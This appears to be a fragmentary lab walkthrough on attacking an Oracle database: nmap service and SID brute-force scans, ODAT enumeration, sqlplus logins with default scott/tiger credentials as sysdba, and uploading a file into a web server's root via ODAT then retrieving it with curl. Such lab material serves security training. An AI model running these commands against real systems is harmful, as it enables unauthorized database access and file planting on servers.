...
Here is a Bash script that does all of that:
...
### ODAT Help Menu (Oracle Database Attacking Tool)

```shell-session
al1abb@htb[/htb]$ ./odat.py -h
...
```shell-session
al1abb@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
...
```shell-session
al1abb@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
...
```shell-session
al1abb@htb[/htb]$ ./odat.py all -s 10.129.204.235
...
```shell-session
al1abb@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
...
```shell-session
al1abb@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
...
```shell-session
al1abb@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
al1abb@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
...
```shell-session
al1abb@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
